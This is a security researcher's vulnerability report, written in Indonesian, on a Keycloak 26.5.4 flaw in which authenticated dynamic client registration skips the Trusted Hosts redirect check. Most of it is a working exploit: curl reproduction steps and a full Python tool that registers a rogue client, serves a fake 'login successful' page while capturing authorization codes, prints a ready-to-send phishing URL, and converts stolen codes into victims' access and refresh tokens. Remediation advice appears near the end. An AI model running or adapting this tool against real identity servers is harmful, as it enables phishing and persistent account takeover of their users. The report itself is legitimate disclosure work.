# Finding #5: DCR Trusted Hosts Bypass — Pencurian Token via Phishing Live

| Field | Value |
|---|---|
| **Severity** | HIGH (CVSS 8.0) |
| **Versi Terdampak** | Keycloak 26.5.4 (stable terbaru, reproduksi terkonfirmasi) |
| **Tipe Kerentanan** | Broken Access Control / Privilege Escalation via Client Registration Policy Bypass |
| **Komponen Terdampak** | DCR Endpoint (`/realms/{realm}/clients-registrations/openid-connect`), Client Registration Policy Engine |
| **Tanggal Validasi** | 2026-02-21 |
| **Peneliti** | Anggi Pradana |

---

## Ringkasan

Dynamic Client Registration (DCR) policy "Trusted Hosts" hanya berlaku untuk registrasi anonymous. User yang punya role `create-client` (realm-management) bisa register OIDC client dengan `redirect_uris` apapun (termasuk ke server milik attacker) via authenticated DCR. Ini memungkinkan serangan phishing live: attacker generate URL phishing dari domain Keycloak asli, jalankan server penangkap, tunggu victim login, lalu otomatis curi token victim.

---

## Konteks Konfigurasi

Konfigurasi DCR policy default. Policy `Trusted Hosts` ada di subType `anonymous` tapi **tidak ada** di subType `authenticated`. Role `create-client` (realm-management) biasanya didelegasikan ke developer untuk self-service client registration.

---

## Deskripsi Detail

### Alur Serangan End-to-End

```
Attacker (punya role create-client)
    │
    ├─ 1. Login, dapat Bearer token
    ├─ 2. Register client jahat via DCR (redirect_uri → server attacker)
    ├─ 3. Generate URL phishing (domain Keycloak asli)
    ├─ 4. Jalankan HTTP server penangkap auth code
    ├─ 5. Kirim URL phishing ke victim
    │
    │  ┌─ Victim klik URL phishing
    │  ├─ Melihat halaman login Keycloak ASLI (100% legitimate)
    │  ├─ Login dengan kredensialnya
    │  └─ Di-redirect ke server attacker (auth code terkirim)
    │
    ├─ 6. Server attacker tangkap auth code
    ├─ 7. Tukar auth code → access token + refresh token victim
    └─ 8. Akses penuh ke akun victim
```

### Analisis Policy

DCR endpoint Keycloak punya dua mode operasi:

- **`anonymous`** — Tanpa autentikasi; dilindungi policy "Trusted Hosts" yang validasi redirect URI.
- **`authenticated`** — Butuh Bearer token; punya policy set terpisah.

Policy `Trusted Hosts` (yang validasi `redirect_uris`) **hanya ada di subType `anonymous`**. SubType `authenticated` tidak punya validasi URI sama sekali.

| Policy | subType `anonymous` | subType `authenticated` |
|---|---|---|
| Trusted Hosts (`client-uris-must-match`) | Diterapkan | **TIDAK ADA** |
| Allowed Protocol Mapper Types | Diterapkan | Diterapkan |
| Allowed Client Scopes | Diterapkan | Diterapkan |
| Max Clients Limit | Diterapkan | Tidak ada |
| Consent Required | Diterapkan | Tidak ada |

### Verifikasi Privilege Boundary

| Aksi | Endpoint | Hasil |
|---|---|---|
| `create-client` role → DCR dengan redirect apapun | `/realms/{realm}/clients-registrations/openid-connect` | **201 Created (BERHASIL)** |
| `create-client` role → Admin REST API | `/admin/realms/{realm}/clients` | **403 Forbidden (DITOLAK)** |
| Anonymous DCR dengan redirect ke attacker | `/realms/{realm}/clients-registrations/openid-connect` | **403 "Trusted Hosts" rejected** |

Client jahat yang terdaftar:
- **Langsung aktif** — tidak perlu approval admin
- **Fully functional** — bisa initiate authorization code flow
- **Punya client secret** — attacker bisa tukar auth code jadi token

---

## Langkah Reproduksi

**Prasyarat:**
- Realm: `test`
- Attacker: `testuser / Password123` dengan role `create-client`
- Victim: `victim / Password123`

### Langkah 1 — Assign role create-client (setup admin)

```bash
ADMIN_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

USER_ID=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://46.101.162.187:8080/admin/realms/test/users?username=testuser" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)[0]['id'])")

RM_CLIENT=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://46.101.162.187:8080/admin/realms/test/clients?clientId=realm-management" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)[0]['id'])")

CREATE_ROLE=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://46.101.162.187:8080/admin/realms/test/clients/$RM_CLIENT/roles/create-client")

curl -s -X POST -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d "[$CREATE_ROLE]" \
  "http://46.101.162.187:8080/admin/realms/test/users/$USER_ID/role-mappings/clients/$RM_CLIENT"
```

### Langkah 2 — Attacker login dan dapat token

```bash
ATTACKER_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=webapp&grant_type=password&username=testuser&password=Password123&scope=openid" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
```

### Langkah 3 — Register client jahat dengan redirect ke server attacker

```bash
REG_RESP=$(curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/openid-connect \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "Aplikasi Resmi Perusahaan",
    "redirect_uris": ["http://46.101.162.187:48888/callback"],
    "grant_types": ["authorization_code","refresh_token"],
    "response_types": ["code"]
  }')
echo "$REG_RESP" | python3 -m json.tool
```

**Response (201 Created — TANPA penolakan Trusted Hosts):**

```json
{
  "client_id": "425bebcb-4dc1-4467-adf1-6d20815712b3",
  "client_secret": "YDEWNkAWu6BanGdCamm8wGGZmHcWXz7D",
  "redirect_uris": ["http://46.101.162.187:48888/callback"],
  "grant_types": ["authorization_code", "refresh_token"]
}
```

### Langkah 4 — Kontrol: Anonymous DCR (benar ditolak)

```bash
curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/openid-connect \
  -H "Content-Type: application/json" \
  -d '{"client_name":"anon-test","redirect_uris":["http://46.101.162.187:48888/callback"]}'
```

```json
{
  "error": "insufficient_scope",
  "error_description": "Policy 'Trusted Hosts' rejected request... Host not trusted."
}
```

### Langkah 5 — Jalankan server penangkap auth code + Buat URL phishing

Attacker jalankan server HTTP listener lalu generate URL phishing:

```
http://46.101.162.187:8080/realms/test/protocol/openid-connect/auth?
  client_id=425bebcb-4dc1-4467-adf1-6d20815712b3&
  response_type=code&
  redirect_uri=http%3A%2F%2F46.101.162.187%3A48888%2Fcallback&
  scope=openid+profile+email
```

URL ini 100% legitimate — domain Keycloak asli. Victim tidak mungkin curiga.

### Langkah 6 — Victim klik URL, login, auth code tertangkap

Victim melihat halaman login Keycloak asli. Setelah login, Keycloak redirect ke server attacker:

```
HTTP 302 → http://46.101.162.187:48888/callback?code=7e7cad47-b4b2-e780-9295-6dd0c51e7e9e...
```

Server attacker otomatis menangkap auth code dan menampilkan halaman "Login Berhasil!" palsu ke victim.

### Langkah 7 — Attacker tukar auth code → token victim

```bash
curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=425bebcb-...&client_secret=YDEWNkAW...&grant_type=authorization_code&code=7e7cad47-...&redirect_uri=http%3A%2F%2F46.101.162.187%3A48888%2Fcallback"
```

**Token victim berhasil dicuri:**

```
Username     : victim
Email        : victim@test.com
Nama Lengkap: Victim User
Scope        : openid profile email
Access Token : eyJhbGciOiJSUzI1NiIsInR5cCI...
Refresh Token: eyJhbGciOiJIUzUxMiIsInR5cCI...
```

### Langkah 8 — Verifikasi: akses data victim

```bash
curl -s http://46.101.162.187:8080/realms/test/protocol/openid-connect/userinfo \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1Ni..."
```

```json
{
  "email_verified": true,
  "name": "Victim User",
  "preferred_username": "victim",
  "email": "victim@test.com"
}
```

---

## Dampak

- **Pencurian token lengkap:** User dengan role `create-client` bisa mencuri token user manapun di realm, termasuk administrator, dengan register client jahat dan phishing via halaman login Keycloak asli.
- **Tidak ada indikator kompromi untuk victim:** Halaman login ada di domain Keycloak asli dengan HTTPS. Tidak ada elemen UI mencurigakan, tidak ada warning browser.
- **Akses persisten:** Refresh token yang dicuri memberikan akses berkelanjutan sampai victim ganti password.
- **Bypass semua redirect_uri allowlisting:** Proteksi `Trusted Hosts` yang dikonfigurasi admin tidak berlaku untuk authenticated DCR.
- **Skala ke semua user di realm:** Satu registrasi client jahat bisa phishing semua user. Attacker hanya perlu distribusi URL.

---

## Rekomendasi

1. **Terapkan policy `Trusted Hosts` ke subType `authenticated`.** Validasi URI yang sama harus diterapkan untuk registrasi authenticated. Ini perbaikan utama.
2. **Wajibkan approval admin untuk client DCR.** Tambah policy `client-disabled` ke subType authenticated agar client baru butuh aktivasi admin sebelum bisa initiate auth flow.
3. **Tambah validasi domain URI ke policy set `authenticated`.** Batasi `redirect_uris` ke domain yang sudah di-approve.
4. **Audit client yang sudah terdaftar via DCR** untuk redirect URI yang tidak seharusnya.

---

## Proof of Concept — Source Code Lengkap

**File:** `pocs/poc_f5_dcr_hijack.py`

**Penggunaan:**

```bash
# Mode interaktif (tunggu victim buka URL di browser):
python3 poc_f5_dcr_hijack.py --host http://46.101.162.187:8080 --listen-port 48888

# Mode otomatis (simulasi victim untuk testing):
python3 poc_f5_dcr_hijack.py --host http://46.101.162.187:8080 --auto-victim --timeout 30
```

**Parameter:**
- `--host` — URL Keycloak (default: http://46.101.162.187:8080)
- `--listen-port` — Port server phishing attacker (default: 48888)
- `--realm` — Target realm (default: test)
- `--timeout` — Timeout menunggu victim dalam detik (default: 300)
- `--auto-victim` — Otomatis simulasi victim login (untuk testing/CI)

**Source:**

```python
#!/usr/bin/env python3
"""
Finding #5: DCR Trusted Hosts Bypass — Serangan Phishing Live + Pencurian Token
Severity: HIGH (CVSS 8.0)
Target: Keycloak 26.5.4

Serangan otomatis end-to-end:
1. Register client jahat via authenticated DCR (bypass Trusted Hosts)
2. Generate URL phishing yang siap kirim ke victim
3. Jalankan server HTTP listener, tunggu victim klik & login
4. Tangkap auth code dari redirect, tukar jadi token victim
5. Tampilkan data victim yang berhasil dicuri

Penggunaan:
  python3 poc_f5_dcr_hijack.py --host http://46.101.162.187:8080
  python3 poc_f5_dcr_hijack.py --host http://46.101.162.187:8080 --listen-port 48888 --timeout 600
"""

import http.client
import http.server
import json
import base64
import argparse
import sys
import re
import socket
import time
import threading
import urllib.parse

# ═══ Warna ANSI ═══
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"

# ═══ Global: simpan auth code yang ditangkap ═══
captured_code = None
captured_event = threading.Event()


def banner():
    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
║  Finding #5: DCR Trusted Hosts Bypass                        ║
║  Serangan Phishing Live — Pencurian Token Otomatis           ║
║  Keycloak 26.5.4 — CVSS 8.0 (HIGH)                         ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")


def langkah(n, msg):
    print(f"\n{BOLD}{CYAN}[Langkah {n}]{RESET} {BOLD}{msg}{RESET}")


def sukses(msg):
    print(f"  {GREEN}[✓]{RESET} {msg}")


def gagal(msg):
    print(f"  {RED}[✗]{RESET} {msg}")


def info(msg):
    print(f"  {BLUE}[*]{RESET} {msg}")


def peringatan(msg):
    print(f"  {YELLOW}[!]{RESET} {msg}")


# ═══ HTTP Helpers ═══

def http_post_form(host, port, path, data, token=None):
    """POST form-urlencoded, return (status, dict)"""
    conn = http.client.HTTPConnection(host, port, timeout=15)
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    body = urllib.parse.urlencode(data) if isinstance(data, dict) else data
    conn.request("POST", path, body, headers)
    resp = conn.getresponse()
    raw = resp.read().decode()
    status = resp.status
    conn.close()
    try:
        return status, json.loads(raw)
    except json.JSONDecodeError:
        return status, {"_raw": raw}


def http_post_json(host, port, path, data, token=None):
    """POST JSON, return (status, dict)"""
    conn = http.client.HTTPConnection(host, port, timeout=15)
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    conn.request("POST", path, json.dumps(data), headers)
    resp = conn.getresponse()
    raw = resp.read().decode()
    status = resp.status
    conn.close()
    try:
        return status, json.loads(raw)
    except json.JSONDecodeError:
        return status, {"_raw": raw}


def http_get_json(host, port, path, token=None):
    """GET JSON, return (status, dict/list)"""
    conn = http.client.HTTPConnection(host, port, timeout=15)
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    conn.request("GET", path, headers=headers)
    resp = conn.getresponse()
    raw = resp.read().decode()
    status = resp.status
    conn.close()
    try:
        return status, json.loads(raw)
    except json.JSONDecodeError:
        return status, {"_raw": raw}


def get_admin_token(port):
    """Ambil admin token via localhost"""
    status, data = http_post_form("localhost", port,
        "/realms/master/protocol/openid-connect/token",
        {"client_id": "admin-cli", "grant_type": "password",
         "username": "admin", "password": "Admin1234"})
    return data.get("access_token", "")


def decode_jwt(token):
    """Decode JWT payload tanpa verifikasi"""
    payload = token.split(".")[1]
    payload += "=" * (4 - len(payload) % 4)
    return json.loads(base64.b64decode(payload))


# ═══ Server Phishing (Tangkap Auth Code dari Victim) ═══

class PhishingHandler(http.server.BaseHTTPRequestHandler):
    """Handler HTTP yang menangkap auth code dari redirect Keycloak."""

    def do_GET(self):
        global captured_code
        params = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)

        if "code" in params:
            captured_code = params["code"][0]

            # Tampilkan halaman palsu ke victim — terlihat seperti login berhasil
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            html = """<!DOCTYPE html>
<html lang="id"><head><meta charset="utf-8"><title>Login Berhasil</title>
<style>
  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
         text-align: center; padding: 60px 20px; background: #f0f2f5; color: #333; }
  .card { background: #fff; padding: 48px; border-radius: 12px; max-width: 420px;
          margin: 0 auto; box-shadow: 0 2px 12px rgba(0,0,0,0.08); }
  .icon { font-size: 72px; color: #4CAF50; margin-bottom: 16px; }
  h2 { margin: 0 0 8px; font-size: 24px; }
  p { color: #666; margin: 4px 0; font-size: 15px; }
  .small { color: #aaa; font-size: 12px; margin-top: 24px; }
</style></head><body>
<div class="card">
  <div class="icon">&#10004;</div>
  <h2>Login Berhasil!</h2>
  <p>Anda telah berhasil masuk ke aplikasi.</p>
  <p class="small">Halaman ini dapat ditutup.</p>
</div></body></html>"""
            self.wfile.write(html.encode())

            # Beritahu terminal attacker
            print(f"\n  {RED}{BOLD}{'=' * 55}{RESET}")
            print(f"  {RED}{BOLD}  *** AUTH CODE VICTIM TERTANGKAP! ***{RESET}")
            print(f"  {RED}{BOLD}{'=' * 55}{RESET}")
            print(f"  {RED}  Code: {captured_code[:50]}...{RESET}")
            print(f"  {RED}{BOLD}{'=' * 55}{RESET}")

            captured_event.set()
        else:
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"<html><body>Loading...</body></html>")

    def log_message(self, format, *args):
        pass


def mulai_server_phishing(port):
    """Jalankan HTTP server di background thread."""
    class ReusableServer(http.server.HTTPServer):
        allow_reuse_address = True
        def server_bind(self):
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            super().server_bind()

    server = ReusableServer(("0.0.0.0", port), PhishingHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server


# ═══ Main ═══

def main():
    parser = argparse.ArgumentParser(
        description="PoC Finding #5: DCR Trusted Hosts Bypass — Serangan Phishing Live")
    parser.add_argument("--host", default="http://46.101.162.187:8080",
                        help="URL Keycloak (default: http://46.101.162.187:8080)")
    parser.add_argument("--listen-port", type=int, default=48888,
                        help="Port untuk server phishing attacker (default: 48888)")
    parser.add_argument("--realm", default="test",
                        help="Target realm (default: test)")
    parser.add_argument("--timeout", type=int, default=300,
                        help="Timeout menunggu victim dalam detik (default: 300)")
    parser.add_argument("--auto-victim", action="store_true",
                        help="Otomatis simulasi victim login (untuk testing/CI)")
    args = parser.parse_args()

    # Parse host
    parsed = urllib.parse.urlparse(args.host)
    kc_host = parsed.hostname
    kc_port = parsed.port or 8080
    public_ip = "46.101.162.187"
    listen_port = args.listen_port
    realm = args.realm
    callback_url = f"http://{public_ip}:{listen_port}/callback"
    hasil = []

    banner()
    info(f"Target Keycloak : {kc_host}:{kc_port}")
    info(f"Server phishing : {public_ip}:{listen_port}")
    info(f"Timeout victim  : {args.timeout} detik")

    # ══════════════════════════════════════════════════════════════
    # LANGKAH 0: Setup
    # ══════════════════════════════════════════════════════════════
    langkah(0, "Setup — Assign role create-client ke testuser")

    admin_token = get_admin_token(kc_port)
    if not admin_token:
        gagal("Gagal dapat admin token! Pastikan Keycloak berjalan.")
        return 1
    sukses("Admin token OK")

    _, users = http_get_json("localhost", kc_port,
        f"/admin/realms/{realm}/users?username=testuser", admin_token)
    if not users or not isinstance(users, list) or len(users) == 0:
        gagal("testuser tidak ditemukan!")
        return 1
    user_id = users[0]["id"]
    info(f"testuser ID: {user_id}")

    _, rm_clients = http_get_json("localhost", kc_port,
        f"/admin/realms/{realm}/clients?clientId=realm-management", admin_token)
    rm_client_id = rm_clients[0]["id"]

    _, create_role = http_get_json("localhost", kc_port,
        f"/admin/realms/{realm}/clients/{rm_client_id}/roles/create-client", admin_token)

    http_post_json("localhost", kc_port,
        f"/admin/realms/{realm}/users/{user_id}/role-mappings/clients/{rm_client_id}",
        [create_role], admin_token)
    sukses("Role create-client berhasil di-assign ke testuser")

    # ══════════════════════════════════════════════════════════════
    # LANGKAH 1: Attacker login
    # ══════════════════════════════════════════════════════════════
    langkah(1, "ATTACKER — Login sebagai testuser (punya role create-client)")

    status, data = http_post_form(kc_host, kc_port,
        f"/realms/{realm}/protocol/openid-connect/token",
        {"client_id": "webapp", "grant_type": "password",
         "username": "testuser", "password": "Password123", "scope": "openid"})

    attacker_token = data.get("access_token", "")
    if not attacker_token:
        gagal(f"Login gagal: {data}")
        return 1
    sukses(f"Login berhasil — token: {attacker_token[:40]}...")

    # ══════════════════════════════════════════════════════════════
    # LANGKAH 2: Register client jahat
    # ══════════════════════════════════════════════════════════════
    langkah(2, "ATTACKER — Register client jahat via Dynamic Client Registration")

    info(f"Redirect URI ke server attacker: {callback_url}")

    dcr_data = {
        "client_name": "Aplikasi Resmi Perusahaan",
        "redirect_uris": [callback_url],
        "grant_types": ["authorization_code", "refresh_token"],
        "response_types": ["code"],
        "token_endpoint_auth_method": "client_secret_basic"
    }

    status, reg_resp = http_post_json(kc_host, kc_port,
        f"/realms/{realm}/clients-registrations/openid-connect",
        dcr_data, attacker_token)

    if "client_id" not in reg_resp:
        gagal(f"DCR gagal (HTTP {status}): {reg_resp}")
        return 1

    mal_client_id = reg_resp["client_id"]
    mal_secret = reg_resp.get("client_secret", "")

    sukses("Client jahat BERHASIL terdaftar!")
    print(f"    {MAGENTA}Client ID     : {mal_client_id}{RESET}")
    print(f"    {MAGENTA}Client Secret : {mal_secret}{RESET}")
    print(f"    {MAGENTA}Redirect URI  : {callback_url}{RESET}")
    print(f"    {MAGENTA}Nama Client   : Aplikasi Resmi Perusahaan{RESET}")
    peringatan("Trusted Hosts policy TIDAK berlaku untuk authenticated DCR!")
    hasil.append(("DCR bypass (register client jahat)", True))

    # ══════════════════════════════════════════════════════════════
    # LANGKAH 3: Kontrol — Anonymous DCR
    # ══════════════════════════════════════════════════════════════
    langkah(3, "KONTROL — Anonymous DCR (tanpa autentikasi)")

    status, anon_resp = http_post_json(kc_host, kc_port,
        f"/realms/{realm}/clients-registrations/openid-connect",
        {"client_name": "anon-test", "redirect_uris": [callback_url]})

    anon_desc = anon_resp.get("error_description", anon_resp.get("error", str(anon_resp)))
    if status == 403 or "Trusted Hosts" in str(anon_resp):
        sukses(f"Anonymous DCR DITOLAK (benar): {anon_desc[:80]}")
        hasil.append(("Kontrol: Anonymous DCR ditolak", True))
    else:
        peringatan(f"Anonymous DCR tidak ditolak (HTTP {status})")
        hasil.append(("Kontrol: Anonymous DCR ditolak", False))

    info("Policy gap terkonfirmasi: Anonymous=DITOLAK, Authenticated=LOLOS")

    # ══════════════════════════════════════════════════════════════
    # LANGKAH 4: Jalankan server phishing
    # ══════════════════════════════════════════════════════════════
    langkah(4, "ATTACKER — Jalankan server phishing (penangkap auth code)")

    server = mulai_server_phishing(listen_port)
    sukses(f"Server phishing aktif di 0.0.0.0:{listen_port}")
    info("Server akan menangkap auth code saat victim di-redirect kesini")

    # ══════════════════════════════════════════════════════════════
    # LANGKAH 5: Generate URL phishing
    # ══════════════════════════════════════════════════════════════
    langkah(5, "ATTACKER — Buat URL phishing")

    phishing_url = (
        f"http://{public_ip}:{kc_port}/realms/{realm}/protocol/openid-connect/auth"
        f"?client_id={mal_client_id}"
        f"&response_type=code"
        f"&redirect_uri={urllib.parse.quote(callback_url, safe='')}"
        f"&scope=openid+profile+email"
    )

    print(f"""
  {RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
  ║                 URL PHISHING SIAP KIRIM                      ║
  ╚══════════════════════════════════════════════════════════════╝{RESET}

  {BOLD}{WHITE}Kirim URL berikut ke target victim:{RESET}

  {CYAN}{BOLD}{phishing_url}{RESET}

  {YELLOW}> URL ini terlihat 100% legitimate (domain Keycloak asli)
  > Victim akan melihat halaman login Keycloak yang asli
  > Setelah login, auth code otomatis dikirim ke server kita
  > Victim melihat halaman "Login Berhasil" yang palsu{RESET}

  {BOLD}Menunggu victim mengklik URL dan login...{RESET}
  {DIM}(Buka URL di atas di browser untuk simulasi victim){RESET}
  {DIM}Timeout: {args.timeout} detik{RESET}
""")

    # ══════════════════════════════════════════════════════════════
    # LANGKAH 6: Tunggu victim
    # ══════════════════════════════════════════════════════════════
    langkah(6, f"Menunggu victim login... (timeout {args.timeout}s)")

    if args.auto_victim:
        info("Mode --auto-victim: simulasi victim login otomatis...")
        victim_thread = threading.Thread(
            target=simulasi_victim_login,
            args=(kc_host, kc_port, realm, mal_client_id, callback_url),
            daemon=True)
        victim_thread.start()

    start_time = time.time()
    spinner = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    idx = 0
    while not captured_event.is_set():
        elapsed = int(time.time() - start_time)
        remaining = args.timeout - elapsed
        if remaining <= 0:
            break
        print(f"\r  {YELLOW}{spinner[idx % len(spinner)]}{RESET} "
              f"Menunggu victim... ({elapsed}s / {args.timeout}s) "
              f"— Buka URL di browser untuk simulasi", end="", flush=True)
        idx += 1
        captured_event.wait(timeout=0.3)

    print("\r" + " " * 80 + "\r", end="")

    if not captured_code:
        gagal(f"Timeout — tidak ada victim yang login dalam {args.timeout} detik")
        server.shutdown()
        print_ringkasan(hasil)
        return 1

    sukses("Auth code victim berhasil ditangkap!")
    info(f"Auth code: {captured_code[:50]}...")
    hasil.append(("Auth code tertangkap via redirect", True))

    # ══════════════════════════════════════════════════════════════
    # LANGKAH 7: Tukar auth code → token victim
    # ══════════════════════════════════════════════════════════════
    langkah(7, "ATTACKER — Tukar auth code curian menjadi token victim")

    status, token_resp = http_post_form(kc_host, kc_port,
        f"/realms/{realm}/protocol/openid-connect/token",
        {"client_id": mal_client_id,
         "client_secret": mal_secret,
         "grant_type": "authorization_code",
         "code": captured_code,
         "redirect_uri": callback_url})

    if "access_token" not in token_resp:
        gagal(f"Token exchange gagal: {token_resp}")
        server.shutdown()
        print_ringkasan(hasil)
        return 1

    claims = decode_jwt(token_resp["access_token"])

    print(f"""
  {RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
  ║           TOKEN VICTIM BERHASIL DICURI!                      ║
  ╚══════════════════════════════════════════════════════════════╝{RESET}

    {BOLD}Username     :{RESET} {RED}{claims.get('preferred_username', 'N/A')}{RESET}
    {BOLD}Email        :{RESET} {RED}{claims.get('email', 'N/A')}{RESET}
    {BOLD}Nama Lengkap:{RESET} {RED}{claims.get('name', 'N/A')}{RESET}
    {BOLD}User ID      :{RESET} {RED}{claims.get('sub', 'N/A')}{RESET}
    {BOLD}Scope        :{RESET} {RED}{token_resp.get('scope', 'N/A')}{RESET}
    {BOLD}Access Token :{RESET} {RED}{token_resp['access_token'][:60]}...{RESET}
    {BOLD}Refresh Token:{RESET} {RED}{token_resp.get('refresh_token', '')[:60]}...{RESET}

  {YELLOW}{BOLD}Attacker sekarang punya akses penuh ke akun victim!{RESET}
""")
    hasil.append(("Token victim berhasil dicuri", True))

    # ══════════════════════════════════════════════════════════════
    # LANGKAH 8: Verifikasi akses data victim
    # ══════════════════════════════════════════════════════════════
    langkah(8, "ATTACKER — Verifikasi akses data victim dengan token curian")

    status, userinfo = http_get_json(kc_host, kc_port,
        f"/realms/{realm}/protocol/openid-connect/userinfo",
        token_resp["access_token"])

    if status == 200:
        sukses("Userinfo victim berhasil diakses:")
        for k, v in userinfo.items():
            if k not in ("sub",):
                print(f"    {k}: {v}")
        hasil.append(("Akses data victim terverifikasi", True))
    else:
        peringatan(f"Userinfo gagal (HTTP {status})")
        hasil.append(("Akses data victim terverifikasi", False))

    server.shutdown()
    print_ringkasan(hasil)
    return 0


def simulasi_victim_login(kc_host, kc_port, realm, client_id, redirect_uri):
    """Simulasi victim login otomatis (untuk mode --auto-victim)."""
    time.sleep(2)

    try:
        auth_path = (
            f"/realms/{realm}/protocol/openid-connect/auth"
            f"?client_id={client_id}&response_type=code"
            f"&redirect_uri={urllib.parse.quote(redirect_uri, safe='')}"
            f"&scope=openid+profile+email"
        )

        conn = http.client.HTTPConnection(kc_host, kc_port, timeout=15)
        conn.request("GET", auth_path)
        resp = conn.getresponse()
        body = resp.read().decode()
        cookies_raw = [v for k, v in resp.getheaders() if k.lower() == "set-cookie"]
        location = resp.getheader("Location", "")
        status = resp.status
        conn.close()

        cookies = {}
        for c in cookies_raw:
            part = c.split(";")[0]
            if "=" in part:
                k, v = part.split("=", 1)
                cookies[k] = v

        while status in (302, 303) and location:
            if location.startswith("http"):
                loc_parsed = urllib.parse.urlparse(location)
                loc_path = loc_parsed.path + ("?" + loc_parsed.query if loc_parsed.query else "")
            else:
                loc_path = location

            conn = http.client.HTTPConnection(kc_host, kc_port, timeout=15)
            cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
            conn.request("GET", loc_path, headers={"Cookie": cookie_str} if cookie_str else {})
            resp = conn.getresponse()
            body = resp.read().decode()
            for c in [v for k, v in resp.getheaders() if k.lower() == "set-cookie"]:
                part = c.split(";")[0]
                if "=" in part:
                    k, v = part.split("=", 1)
                    cookies[k] = v
            location = resp.getheader("Location", "")
            status = resp.status
            conn.close()

        action_match = re.search(r'action="([^"]+)"', body)
        if not action_match:
            return

        action_url = action_match.group(1).replace("&amp;", "&")
        if action_url.startswith("http"):
            action_parsed = urllib.parse.urlparse(action_url)
            action_path = action_parsed.path + ("?" + action_parsed.query if action_parsed.query else "")
        else:
            action_path = action_url

        login_body = "username=victim&password=Password123&credentialId="
        cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())

        conn = http.client.HTTPConnection(kc_host, kc_port, timeout=15)
        conn.request("POST", action_path, login_body, {
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": cookie_str
        })
        resp = conn.getresponse()
        resp.read()
        redirect_location = resp.getheader("Location", "")
        conn.close()

        if redirect_location and str(listen_port_global) in redirect_location:
            redir_parsed = urllib.parse.urlparse(redirect_location)
            conn = http.client.HTTPConnection(redir_parsed.hostname, redir_parsed.port, timeout=10)
            conn.request("GET", redir_parsed.path + "?" + redir_parsed.query)
            conn.getresponse().read()
            conn.close()

    except Exception:
        pass


listen_port_global = 48888


def print_ringkasan(hasil):
    """Tampilkan ringkasan hasil tes."""
    vuln_count = sum(1 for _, v in hasil if v)

    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
║                    RINGKASAN HASIL                           ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")
    for nama, vuln in hasil:
        status_str = f"{RED}VULNERABLE{RESET}" if vuln else f"{GREEN}AMAN{RESET}"
        print(f"  {nama:45s} {status_str}")

    print(f"""
{YELLOW}Dampak Serangan:{RESET}
  - User dengan role create-client bisa mencuri token user MANAPUN
  - Victim melihat halaman login Keycloak yang 100% asli (domain trusted)
  - Refresh token memberikan akses persisten ke akun victim
  - Satu client jahat bisa phishing semua user di realm

{YELLOW}Policy Gap:{RESET}
  - Anonymous DCR   : Trusted Hosts DITERAPKAN (benar memblokir)
  - Authenticated DCR: Trusted Hosts TIDAK ADA (membolehkan redirect apapun)
  - Admin REST API  : Return 403 (benar memblokir)

{YELLOW}Akar Masalah:{RESET}
  Policy "Trusted Hosts" hanya ada di subType "anonymous".
  SubType "authenticated" tidak punya validasi URI sama sekali.
""")

    if vuln_count > 0:
        print(f"{RED}{BOLD}[!] KERENTANAN TERKONFIRMASI — {vuln_count}/{len(hasil)} tes positif{RESET}")
    else:
        print(f"{GREEN}{BOLD}[+] Semua tes aman — tidak rentan{RESET}")


if __name__ == "__main__":
    listen_port_global = 48888
    for i, arg in enumerate(sys.argv):
        if arg == "--listen-port" and i + 1 < len(sys.argv):
            listen_port_global = int(sys.argv[i + 1])
    sys.exit(main())
```

---

*Finding ini divalidasi pada 2026-02-21 terhadap instance Keycloak 26.5.4 baru di VPS privat milik peneliti. Tidak ada sistem produksi, data user nyata, atau infrastruktur pihak ketiga yang diakses.*
